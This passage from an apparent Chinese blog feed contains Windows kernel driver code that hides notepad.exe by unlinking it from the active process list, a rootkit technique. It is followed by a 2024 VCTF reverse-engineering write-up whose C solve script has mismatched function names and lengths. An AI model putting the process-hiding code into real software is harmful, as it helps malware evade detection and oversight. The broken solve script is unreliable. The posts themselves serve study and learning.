class="line"></span><br><span class="line">    DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    WinVersion = GetWindowsVersion();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(WinVersion)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WINDOWS_XP:   <span class="comment">//32Bits</span></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            ActiveOffsetPre =  <span class="number">0x8c</span>;</span><br><span class="line">            ActiveOffsetNext = <span class="number">0x88</span>;</span><br><span class="line">            ImageName = <span class="number">0x174</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WINDOWS_7:   <span class="comment">//64Bits</span></span><br><span class="line">        &#123;</span><br><span class="line">            ActiveOffsetPre =  <span class="number">0x190</span>;</span><br><span class="line">            ActiveOffsetNext = <span class="number">0x188</span>;</span><br><span class="line">            ImageName = <span class="number">0x2e0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HideProcess(<span class="string">&quot;notepad.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HeadEntry = (PLIST_ENTRY)((ULONG_PTR)PsGetCurrentProcess()+ActiveOffsetNext);<span class="comment">// 在DriverEntry中执行得到的才是System进程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">HideProcess</span><span class="params">(<span class="type">char</span>* ProcessName)</span></span><br><span class="line">&#123;</span><br><span class="line">    PEPROCESS EProcessCurrent = <span class="literal">NULL</span>;</span><br><span class="line">    PEPROCESS EProcessPre = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    EProcessCurrent = PsGetCurrentProcess();    <span class="comment">//System  EProcess</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    EProcessPre = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetPre)))-ActiveOffsetNext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;EProcessCurrent: 0x%p\r\n&quot;,EProcessCurrent);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;EProcessNext: 0x%p\r\n&quot;,EProcessNext);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (EProcessCurrent!=EProcessPre)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//    DbgPrint(&quot;%s\r\n&quot;,(char*)((ULONG_PTR)EProcessCurrent+ImageName));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>((<span class="type">char</span>*)((ULONG_PTR)EProcessCurrent+ImageName),ProcessName)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Temp = (PLIST_ENTRY)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (MmIsAddressValid(Temp))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//    Temp-&gt;Blink-&gt;Flink = Temp-&gt;Flink;</span></span><br><span class="line">                <span class="comment">//    Temp-&gt;Flink-&gt;Blink = Temp-&gt;Blink;   //数据结构  不稳定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                RemoveEntryList(Temp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        EProcessCurrent = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext)))-ActiveOffsetNext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">UnloadDriver</span><span class="params">(PDRIVER_OBJECT  DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    ResumeProcess();</span><br><span class="line">    DbgPrint(<span class="string">&quot;UnloadDriver\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">ResumeProcess</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Temp!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        InsertHeadList(HeadEntry,Temp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WIN_VERSION <span class="title function_">GetWindowsVersion</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    RTL_OSVERSIONINFOEXW osverInfo = &#123;<span class="keyword">sizeof</span>(osverInfo)&#125;;</span><br><span class="line">    pfnRtlGetVersion RtlGetVersion = <span class="literal">NULL</span>;</span><br><span class="line">    WIN_VERSION WinVersion;</span><br><span class="line">    WCHAR wzRtlGetVersion[] = <span class="string">L&quot;RtlGetVersion&quot;</span>;</span><br><span class="line"></span><br><span class="line">    RtlGetVersion = GetFunctionAddressByName(wzRtlGetVersion);    <span class="comment">//Ntoskrnl.exe  导出表</span></span><br><span class="line">    <span class="keyword">if</span> (RtlGetVersion)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlGetVersion((PRTL_OSVERSIONINFOW)&amp;osverInfo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PsGetVersion(&amp;osverInfo.dwMajorVersion, &amp;osverInfo.dwMinorVersion, &amp;osverInfo.dwBuildNumber, <span class="literal">NULL</span>);   <span class="comment">//Documet</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Build Number: %d\r\n&quot;</span>, osverInfo.dwBuildNumber);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (osverInfo.dwMajorVersion == <span class="number">5</span> &amp;&amp; osverInfo.dwMinorVersion == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;WINDOWS_XP\r\n&quot;</span>);</span><br><span class="line">        WinVersion = WINDOWS_XP;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osverInfo.dwMajorVersion == <span class="number">6</span> &amp;&amp; osverInfo.dwMinorVersion == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;WINDOWS 7\r\n&quot;</span>);</span><br><span class="line">        WinVersion = WINDOWS_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osverInfo.dwMajorVersion == <span class="number">6</span> &amp;&amp;</span><br><span class="line">        osverInfo.dwMinorVersion == <span class="number">2</span> &amp;&amp;</span><br><span class="line">        osverInfo.dwBuildNumber == <span class="number">9200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;WINDOWS 8\r\n&quot;</span>);</span><br><span class="line">        WinVersion = WINDOWS_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osverInfo.dwMajorVersion == <span class="number">6</span> &amp;&amp;</span><br><span class="line">        osverInfo.dwMinorVersion == <span class="number">3</span> &amp;&amp;</span><br><span class="line">        osverInfo.dwBuildNumber == <span class="number">9600</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;WINDOWS 8.1\r\n&quot;</span>);</span><br><span class="line">        WinVersion = WINDOWS_8_1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;WINDOWS_UNKNOW\r\n&quot;</span>);</span><br><span class="line">        WinVersion = WINDOWS_UNKNOW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> WinVersion;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID</span><br><span class="line">    <span class="title function_">GetFunctionAddressByName</span><span class="params">(WCHAR *wzFunction)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING uniFunction;</span><br><span class="line">    PVOID AddrBase = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (wzFunction &amp;&amp; wcslen(wzFunction) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RtlInitUnicodeString(&amp;uniFunction, wzFunction);      <span class="comment">//常量指针</span></span><br><span class="line">        AddrBase = MmGetSystemRoutineAddress(&amp;uniFunction);  <span class="comment">//在System 进程  第一个模块  Ntosknrl.exe  ExportTable</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> AddrBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024VCTF-WP</title>
      <link href="/posts/6613f1ab.html"/>
      <url>/posts/6613f1ab.html</url>
      
        <content type="html"><![CDATA[<h1>2024VCTF-WP</h1><h2 id="一-ezre">一.ezre</h2><p>​1.先查一手壳，64位无壳</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109642-2105037381.png" alt="image-20240316231022612"></p><p>​2.找到主函数一顿分析发现有爆红</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109540-907749819.png" alt="image-20240316231540215"></p><p>跟进一下，然后让ida重新分析一手</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109568-1216495659.png" alt="image-20240316231636804"></p><p>​3.重新分析之后这块儿参数都没了，不知道是不是ida的问题，然后跟进sub_1248函数瞅一眼，应该是base64编码，然后最后码表从s中取</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109759-93267316.png" alt="image-20240316231913899"></p><p>​4.回头抽了一眼密文最后有个等号，确定应该就是base64，然后直接用在线平台自定义base64解出来，得到一串看不见的字符，一直怀疑是不是哪儿搞错了，然后怀着怀疑的态度，接着往上逆回去。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109910-1528160580.png" alt="image-20240316232306247"></p><p>​5.这块儿俩函数都用到了这个参数，但是跟进去看的时候瞅不见，看来得动态一下子</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109524-1077554653.png" alt="image-20240316232636074"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109564-46386756.png" alt="image-20240316232647386"></p><p>​6.服务起来之后随便输入几个数</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001110202-889313139.png" alt="image-20240316232954454"></p><p>​7.先把这个变量取出来</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109570-2096605359.png" alt="image-20240316233058348"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x08</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x2E</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x1B</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7E</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x11</span>, <span class="number">0x21</span>, <span class="number">0x25</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x3E</span>, <span class="number">0x4D</span>, <span class="number">0x5B</span>, <span class="number">0x4C</span>, <span class="number">0x17</span>, <span class="number">0x29</span>, <span class="number">0x78</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0x7B</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x5A</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x19</span>, <span class="number">0x15</span>, <span class="number">0x73</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x43</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x70</span>, <span class="number">0x16</span>, <span class="number">0x77</span>, <span class="number">0x0C</span>, <span class="number">0x67</span>, <span class="number">0x51</span>, </span><br><span class="line">  <span class="number">0x6F</span>, <span class="number">0x03</span>, <span class="number">0x6D</span>, <span class="number">0x58</span>, <span class="number">0x4E</span>, <span class="number">0x37</span>, <span class="number">0x12</span>, <span class="number">0x2D</span>, <span class="number">0x4A</span>, <span class="number">0x1A</span>, </span><br><span class="line">  <span class="number">0x4F</span>, <span class="number">0x5F</span>, <span class="number">0x4B</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x0F</span>, <span class="number">0x1D</span>, <span class="number">0x0E</span>, <span class="number">0x31</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x1E</span>, <span class="number">0x22</span>, <span class="number">0x36</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x28</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x63</span>, <span class="number">0x5E</span>, <span class="number">0x64</span>, <span class="number">0x72</span>, <span class="number">0x3B</span>, <span class="number">0x5D</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x46</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x44</span>, <span class="number">0x1F</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x57</span>, <span class="number">0x20</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x27</span>, <span class="number">0x40</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x62</span>, <span class="number">0x06</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​8.再看题，好像明了了，第一个函数应该是假的，用的假字符串，所以下一步直接看含有输入的sub_6301026996B3这个函数就行</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109563-1913004048.png" alt="image-20240316233355707"></p><p>​9.一开始一直没看出来这个函数是啥加密，然后最后总结了一下，对于输入的明文进行加密的好像只有最后一步的异或，选择直接把函数dump出来，赌一把是不是对称的</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109737-327139633.png" alt="image-20240316233639271"></p><p>​10.贴出脚本，enc为秘钥，然后input数组里是最后密文经过自定义base64编码之前的密文16进制数，整个函数逻辑都是dump题中的加密过程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">HTDWORD</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)((x &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">sub_6301026996B3</span><span class="params">(<span class="type">char</span> enc[], <span class="type">char</span> input[], <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> inputLen)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> result;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ; ++i) &#123;</span><br><span class="line">        result = i;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= inputLen)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v6 = (v6 + <span class="number">1</span>) % <span class="number">128</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> v3 = enc[v6] + v7;</span><br><span class="line">        v7 = (((<span class="built_in">HTDWORD</span>(v3) &gt;&gt; <span class="number">25</span>) + enc[v6] + v7) &amp; <span class="number">0x7F</span>) - (<span class="built_in">HTDWORD</span>(v3) &gt;&gt; <span class="number">25</span>);</span><br><span class="line">        v5 = enc[v6];</span><br><span class="line">        enc[v6] = enc[v7];</span><br><span class="line">        enc[v7] = v5;</span><br><span class="line">        input[i] ^= enc[(enc[v6] + enc[v7]) &amp; <span class="number">0x7F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> inputLen = <span class="number">32</span>;</span><br><span class="line">    <span class="type">char</span> enc[] = &#123;</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x08</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x2E</span>, </span><br><span class="line">        <span class="number">0x1C</span>, <span class="number">0x66</span>, <span class="number">0x1B</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7E</span>, </span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0x5C</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x11</span>, <span class="number">0x21</span>, <span class="number">0x25</span>, <span class="number">0x04</span>, </span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x4D</span>, <span class="number">0x5B</span>, <span class="number">0x4C</span>, <span class="number">0x17</span>, <span class="number">0x29</span>, <span class="number">0x78</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, </span><br><span class="line">        <span class="number">0x7B</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x5A</span>, <span class="number">0x50</span>, <span class="number">0x61</span>, <span class="number">0x19</span>, <span class="number">0x15</span>, <span class="number">0x73</span>, <span class="number">0x7D</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x43</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x70</span>, <span class="number">0x16</span>, <span class="number">0x77</span>, <span class="number">0x0C</span>, <span class="number">0x67</span>, <span class="number">0x51</span>, </span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x03</span>, <span class="number">0x6D</span>, <span class="number">0x58</span>, <span class="number">0x4E</span>, <span class="number">0x37</span>, <span class="number">0x12</span>, <span class="number">0x2D</span>, <span class="number">0x4A</span>, <span class="number">0x1A</span>, </span><br><span class="line">        <span class="number">0x4F</span>, <span class="number">0x5F</span>, <span class="number">0x4B</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x0F</span>, <span class="number">0x1D</span>, <span class="number">0x0E</span>, <span class="number">0x31</span>, <span class="number">0x6E</span>, </span><br><span class="line">        <span class="number">0x79</span>, <span class="number">0x1E</span>, <span class="number">0x22</span>, <span class="number">0x36</span>, <span class="number">0x69</span>, <span class="number">0x7A</span>, <span class="number">0x28</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, </span><br><span class="line">        <span class="number">0x0B</span>, <span class="number">0x63</span>, <span class="number">0x5E</span>, <span class="number">0x64</span>, <span class="number">0x72</span>, <span class="number">0x3B</span>, <span class="number">0x5D</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, </span><br><span class="line">        <span class="number">0x2F</span>, <span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x46</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x44</span>, <span class="number">0x1F</span>, <span class="number">0x34</span>, </span><br><span class="line">        <span class="number">0x18</span>, <span class="number">0x57</span>, <span class="number">0x20</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x02</span>, <span class="number">0x76</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, </span><br><span class="line">        <span class="number">0x07</span>, <span class="number">0x27</span>, <span class="number">0x40</span>, <span class="number">0x2B</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x62</span>, <span class="number">0x06</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> input[] = &#123;</span><br><span class="line">        <span class="number">0x0F</span>,<span class="number">0x3C</span>,<span class="number">0x41</span>,<span class="number">0x75</span>,<span class="number">0x72</span>,<span class="number">0x42</span>,<span class="number">0x53</span>,<span class="number">0x06</span>,<span class="number">0x5D</span>,<span class="number">0x4C</span>,<span class="number">0x32</span>,<span class="number">0x1D</span>,</span><br><span class="line"><span class="number">0x2A</span>,<span class="number">0x5C</span>,<span class="number">0x49</span>,<span class="number">0x26</span>,<span class="number">0x22</span>,<span class="number">0x4B</span>,<span class="number">0x69</span>,<span class="number">0x22</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sub_56453ADC16B3</span>(enc, input, inputLen);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; inputLen; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​11.然后就直接出了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109486-482504632.png" alt="image-20240316234551169"></p><h2 id="二-ezvm（已复现）">二.ezvm（已复现）</h2><p>​又是喜闻乐见的vm，elf文件有个upx壳，一开始用工具脱有报错，可能是upx标识啥的被改了，但是用010看又没找到啥问题，最后想动调一下，试试在ida里手脱，结果在ubuntu里用readelf命令查看发现是个动态链接库文件.so之类的，不太会动调这类文件，最后壳也没脱掉，诶，ctf，诶，vm。</p><p>​接后续复现，按着大佬的wp还有官方的wp才得以解出，该说不说这个魔改的upx确实难弄。一开始脱壳是这样的，果然没这么简单。</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109466-1524571756.png" alt="image-20240320213552081"></p><p>​用010eidtor编辑器改一下该elf文件最后的4个字节就行，然后 -d 脱壳成功</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109754-438836550.png" alt="image-20240320214142629"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109566-1769200409.png" alt="image-20240320214247631"></p><p>vm的初始化函数如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109594-763325364.png" alt="image-20240320235001666"></p><p>算是小型虚拟机吧，只有8种操作：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109487-875802899.png" alt="image-20240320235122957"></p><p>vm运行起来的函数如下：（没改结构体，凑活看了只能）继续跟进到vm_step函数，此函数用于判断每一次执行指令时候取到第几个操作码</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109559-1437576745.png" alt="image-20240320235251951"></p><p>0~7之间选取一种对应的操作指令码，然后对应到相应的指令函数中去</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606001109578-49871846.png" alt="image-20240321000131807"></p><p>思路基本清晰了，下面直接分析8个指令函数就行，然后对照指令写出模拟执行的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">codes = [<span class="number">0xF0</span>, <span class="number">0xE0</span>, <span 